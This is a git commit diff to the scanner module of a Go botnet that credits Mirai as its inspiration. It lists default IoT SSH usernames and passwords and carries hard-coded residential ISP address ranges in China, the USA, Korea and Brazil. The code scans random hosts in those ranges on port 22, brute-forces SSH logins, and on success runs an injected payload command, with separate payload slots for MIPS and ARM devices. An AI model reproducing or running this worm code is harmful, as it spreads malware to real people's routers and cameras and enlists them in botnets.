32c0bacdec5c75ae4a660135010e8dfcf35ede05
bozer <gamerpig197@gmail.com>
2022-12-31 09:50:11 -0500

    update scan networks, and stuff

--- internal/scanner.go
+++ internal/scanner.go
@@ -17,97 +17,123 @@ var (
 	wg         sync.WaitGroup
 	coreReport *string
 	randomNet  string //0.0.0.0/0
-
 	/*
-		Thank you, Mirai for these usernames and passwords list (You are my inspiration).
-	 	Add more usernames and passwords to the slice name "userList" and "paswdList".
+		Add more usernames and passwords to the slice name "userList" and "paswdList".
 	*/
-	userList  = []string{"admin", "root", "user", "guest", "support", "login", "zyfwp", "ZXDSL"}
-	paswdList = []string{"", "admin", "root", "user", "guest", "support", "login", "password", "default", "pass", "1234", "12345", "123456", "12345678", "123456789", "1234567890", "54321", "123123", "888888", "666666", "00000000", "1111", "111111", "1111111", "ikwb", "system", "juantech", "realtek", "smcadmin", "jiocentrum", "hslwificam", "cxlinux", "jvbzd", "ZXDSL", "vizxv", "xmhdipc", "zlxx", "hi3518", "admin1234", "Admin1234", "admin12345", "Admin12345", "1001chin", "klv123", "oelinux123", "klv1234", "xc3511", "Zte521", "7ujMko0admin", "7ujMko0vizxv", "PrOw!aN_fXp", "W!n0&oO7."}
+	userList  = []string{"admin", "root", "user", "guest", "support", "login"}
+	paswdList = []string{"", "admin", "root", "user", "guest", "support", "login", "password", "default", "pass", "1234", "12345", "123456", "12345678", "123456789", "1234567890", "54321", "123123", "888888", "666666", "00000000", "1111", "111111", "1111111", "ikwb", "system", "juantech", "realtek", "smcadmin", "jiocentrum", "hslwificam", "cxlinux", "jvbzd", "ZXDSL", "vizxv", "xmhdipc", "zlxx", "hi3518", "admin1234", "Admin1234", "admin12345", "Admin12345", "1001chin", "klv123", "oelinux123", "klv1234", "xc3511", "Zte521", "7ujMko0admin", "7ujMko0vizxv", "PrOw!aN_fXp"}
 )
 
-var ChinaNetwork = []string{
+var China_Network = []string{
 
-	//CHINANET Hubei province network.
+	//CHINANET jiangsu province network
 
-	"116.211", //116.211.0.0/16
-	"119.96",  //119.96.0.0/16
-	"119.97",  //119.97.0.0/16
-	"119.102", //119.102.0.0/16
-	"58.49",   //58.49.0.0/16
-	"58.53",   //58.53.0.0/16
-	"221.234", //221.234.0.0/16
-	"221.235", //221.235.0.0/16
-
-	//CHINANET Guangdong province network.
-
-	"14.116", //14.116.0.0/16
-	"14.118", //14.118.0.0/16
-	"14.127", //14.127.0.0/16
-	"14.29",  //14.29.0.0/16
-	"121.14", //121.14.0.0/16
-
-	//CHINANET Jiangsu province network.
-
-	"49.70",   //49.70.0.0/16
+	"49.69",   //49.69.0.0/16
+	"49.76",   //49.76.0.0/16
+	"49.81",   //49.81.0.0/16
+	"49.83",   //49.83.0.0/16
+	"58.208",  //58.208.0.0/16
+	"114.216", //114.216.0.0/16
+	"114.218", //114.218.0.0/16
 	"114.230", //114.230.0.0/16
-	"114.239", //114.239.0.0/16
-	"117.93",  //117.93.0.0/16
-	"121.131", //121.131.0.0/16
+	"117.63",  //117.63.0.0/16
+	"121.228", //121.228.0.0/16
+	"180.116", //180.116.0.0/16
+	"221.224", //221.224.0.0/16
+	"221.228", //221.228.0.0/16
+	"221.230", //221.230.0.0/16
 
-	//CHINANET shandong province network.
+	//CHINANET-ZJ Hangzhou node network
 
-	"140.246", //140.246.0.0/16
-	"140.250", //140.250.0.0/16
-	"182.42",  //182.42.0.0/16
-	"182.43",  //182.43.0.0/16
+	"36.24",   //36.24.0.0/16
+	"60.176",  //60.176.0.0/16
+	"60.177",  //60.177.0.0/16
+	"60.186",  //60.186.0.0/16
+	"115.194", //115.194.0.0/16
+	"115.196", //115.196.0.0/16
+	"115.198", //115.198.0.0/16
+	"115.199", //115.199.0.0/16
+	"125.119", //125.119.0.0/16
+	"122.231", //122.231.0.0/16
+	"183.128", //183.128.0.0/16
+	"183.157", //183.157.0.0/16
+	"183.158", //183.158.0.0/16
+	"220.184", //220.184.0.0/16
 
-	//China TieTong Telecommunications Corporation.
+	//China Mobile Communications Corporation
 
-	"36.212",  //36.212.0.0/16
-	"36.208",  //36.208.0.0/16
-	"36.209",  //36.209.0.0/16
-	"110.218", //110.218.0.0/16
-	"110.219", //110.219.0.0/16
-	"110.101", //110.101.0.0/16
-	"110.105", //110.105.0.0/16
-	"122.88",  //122.88.0.0/16
-	"122.94",  //122.94.0.0/16
-	"122.95",  //122.95.0.0/16
+	"111.21",  //111.21.0.0/16
+	"111.43",  //111.43.0.0/16
+	"111.47",  //111.47.0.0/16
+	"111.48",  //111.48.0.0/16
+	"111.59",  //111.59.0.0/16
+	"112.48",  //112.48.0.0/16
+	"117.156", //117.156.0.0/16
+	"120.196", //120.196.0.0/16
+	"120.226", //120.226.0.0/16
+	"120.245", //120.245.0.0/16
+	"183.222", //183.222.0.0/16
+	"183.230", //183.230.0.0/16
+	"183.232", //183.232.0.0/16
+	"183.238", //183.238.0.0/16
+	"223.71",  //223.71.0.0/16
+
+	//CHINANET Guangdong province network
+
+	"58.63",   //58.63.0.0/16
+	"61.141",  //61.141.0.0/16
+	"106.110", //106.110.0.0/16
+	"113.64",  //113.64.0.0/16
+	"113.67",  //113.67.0.0/16
+	"113.68",  //113.68.0.0/16
+	"113.73",  //113.73.0.0/16
+	"113.83",  //113.83.0.0/16
+	"113.87",  //113.87.0.0/16
+	"113.88",  //113.88.0.0/16
+	"113.99",  //113.99.0.0/16
+	"113.104", //113.104.0.0/16
+	"113.105", //113.105.0.0/16
+	"113.116", //113.116.0.0/16
+	"119.146", //119.146.0.0/16
+	"219.131", //219.131.0.0/16
+	"219.137", //219.137.0.0/16
 }
 
-var HongKongNetwork = []string{
+var USA_Network = []string{
 
-	//Asia Pacific Network Information Center, Pty. Ltd.
+	//CenturyLink Communications, LLC
 
-	"43.129",  //43.129.0.0/16
-	"43.128",  //43.128.0.0/16
-	"43.132",  //43.132.0.0/16
-	"43.134",  //43.134.0.0/16
-	"43.154",  //43.154.0.0/16
-	"160.124", //160.124.0.0/16
+	"40.129",  //40.129.0.0/16
+	"67.2",    //67.2.0.0/16
+	"67.6",    //67.6.0.0/16
+	"69.136",  //69.136.0.0/16
+	"71.34",   //71.34.0.0/16
+	"71.210",  //71.210.0.0/16
+	"71.223",  //71.223.0.0/16
+	"73.131",  //73.131.0.0/16
+	"75.173",  //75.173.0.0/16
+	"76.133",  //76.133.0.0/16
+	"98.63",   //98.63.0.0/16
+	"104.129", //104.129.0.0/16
+	"104.224", //104.224.0.0/16
+	"107.152", //107.152.0.0/16
+	"152.44",  //152.44.0.0/16
+	"204.134", //204.134.0.0/16
 
-	//Digital Core Technology Co., Limited
+	//Charter Communications
 
-	"45.207",  //45.207.0.0/16
-	"103.149", //103.149.0.0/16
-	"154.38",  //154.38.0.0/16
-	"156.224", //156.224.0.0/16
-	"156.242", //156.242.0.0/16
-	"210.5",   //210.5.0.0/16
-	"210.209", //210.209.0.0/16
-
-	//ICIDC
-
-	"154.207", //154.207.0.0/16
-	"154.210", //154.210.0.0/16
-	"154.222", //154.222.0.0/16
-	"156.234", //156.234.0.0/16
-	"156.225", //156.225.0.0/16
-	"156.226", //156.226.0.0/16
+	"68.185",  //68.185.0.0/16
+	"70.119",  //70.129.0.0/16
+	"71.8",    //71.8.0.0/16
+	"71.82",   //71.82.0.0/16
+	"72.174",  //72.174.0.0/16
+	"72.176",  //72.176.0.0/16
+	"75.133",  //75.133.0.0/16
+	"98.30",   //98.30.0.0/16
+	"150.220", //150.220.0.0/16
 }
 
-var KoreaNetwork = []string{
+var Korea_Network = []string{
 
 	//Korea Telecom
 
@@ -157,7 +183,7 @@ var KoreaNetwork = []string{
 	"223.171", //223.171.0.0/16
 }
 
-var BrazilNetwork = []string{
+var Brazil_Network = []string{
 
 	//CLARO S.A.
 
@@ -191,31 +217,26 @@ var BrazilNetwork = []string{
 	"191.32",  //191.32.0.0/16
 }
 
-var RandomNetwork = []string{randomNet}
+var Random_Network = []string{randomNet}
+var ipGen []string
 
 func genRange(max, min int) string {
 	rand.Seed(time.Now().UnixNano())
 	return fmt.Sprint(rand.Intn(max+1-min) + min)
 }
 
-func (b *Bot) manageScanRange() string {
-	var ipGen []string
-	ipGen = append(ipGen, b.network, ".")
-	for i := 0; i < 2; i++ {
-		ipGen = append(ipGen, genRange(255, 0), ".")
+func manageRange(arr []string, times, elements int) string {
+	for i := 0; i < times; i++ {
+		arr = append(arr, genRange(255, 0), ".")
 	}
-	ipGen[len(ipGen)-1] = ""
-	return strings.Join(ipGen[0:7], "")
+	arr[len(arr)-1] = ""
+	return strings.Join(arr[0:elements], "")
 }
 
-func (b *Bot) checkPort(ipAddr, port string) string {
-	b.timeout = 200 * time.Millisecond
-	conn, err := net.DialTimeout("tcp", ipAddr+":"+port, b.timeout)
-	if err != nil {
-		return ""
+func setScanSwitch() {
+	if setCall, setKey := SetupCaller(); setKey {
+		setCall.CallBot.scanSwitch = true
 	}
-	conn.Close()
-	return ipAddr
 }
 
 func sshConfig(sshUser, sshPaswd string) *ssh.ClientConfig {
@@ -238,10 +259,14 @@ func (b *Bot) sshExecute(comd string) {
 	sshSesh.Close()
 }
 
-func setScanSwitch() {
-	if setCall, setKey := SetupCaller(); setKey {
-		setCall.CallBot.scanSwitch = true
+func (b *Bot) checkPort(ipAddr, port string) string {
+	b.timeout = 350 * time.Millisecond
+	conn, err := net.DialTimeout("tcp", ipAddr+":"+port, b.timeout)
+	if err != nil {
+		return ""
 	}
+	defer conn.Close()
+	return ipAddr
 }
 
 func (b *Bot) setupScanner(scanNetwork []string, isRandom bool, nCores string) bool {
@@ -252,10 +277,10 @@ func (b *Bot) setupScanner(scanNetwork []string, isRandom bool, nCores string) b
 				if _, key := BlacklistIPs[netID]; key {
 					continue
 				}
-				RandomNetwork[0] = netID + genRange(255, 0)
+				Random_Network[0] = netID + genRange(255, 0)
 			}
 			b.network = scanNetwork[net]
-			nextIP := b.manageScanRange()
+			nextIP := manageRange(append(ipGen, b.network, "."), 2, 7)
 			ptrIP := &nextIP
 
 			if rtnIP := b.checkPort(*ptrIP, "22"); rtnIP == "" {
@@ -268,8 +293,8 @@ func (b *Bot) setupScanner(scanNetwork []string, isRandom bool, nCores string) b
 				}
 				b.checkPort(nextIP, "22")
 			} else {
-				b.tempIP = rtnIP
 				var isLogin bool
+				b.tempIP = rtnIP
 				for user := range userList {
 					if isLogin {
 						break
@@ -285,7 +310,7 @@ func (b *Bot) setupScanner(scanNetwork []string, isRandom bool, nCores string) b
 						b.password = paswdList[paswd]
 						if err == nil {
 							b.Report(nCores + " Installing payload: " + b.tempIP)
-							go b.sshExecute(b.inject("default", false)) //Reuse command injection function from exploit.
+							go b.sshExecute(b.inject("", false)) //Reuse inject function from exploit.
 							isLogin = true
 							break
 						}
@@ -313,16 +338,15 @@ func (b *Bot) setupScanner(scanNetwork []string, isRandom bool, nCores string) b
 	}
 }
 
-func (b *Bot) Scanner() {
+func (b *Bot) scanner() {
 	if setCall, setKey := SetupCaller(); setKey {
 		if value, key := ScanMap[setCall.CallBot.ScanOpt]; key {
 			/*
-				Full core scanning of a bot CPU
 				Create a concurrence followed by the number of cores in the CPU.
 
 				Why use core to scan instead of thread???
 				1) Because I need to be careful about the overheating problem of a bot device even threads in Go are light weight.
-				2) For against excess flood on IRC server when bot device or server has more than 4 cores which is equal to core times 2 when using thread.
+				2) For against excess flood on IRC server when bot device or server have more than 4 cores which is equal to core times 2 when using thread.
 			*/
 			if b.CPU == 1 {
 				singleCore := "SINGLE CORE"
@@ -331,8 +355,12 @@ func (b *Bot) Scanner() {
 				multiCores := "[" + strconv.Itoa(b.CPU) + "] CORES"
 				coreReport = &multiCores
 			}
-			b.DefaultArch = setCall.CallBot.DefaultArch
-			b.MipsArch = setCall.CallBot.MipsArch
+			/*
+				Bind The bot architecture.
+			*/
+			b.DEFAULT_ARCH = setCall.CallBot.DEFAULT_ARCH
+			b.MIPS_ARCH = setCall.CallBot.MIPS_ARCH
+			b.ARM_ARCH = setCall.CallBot.ARM_ARCH
 
 			b.Report(*coreReport + " START SCANNING ON " +
 				value.scanOptFull + " NETWORK...")
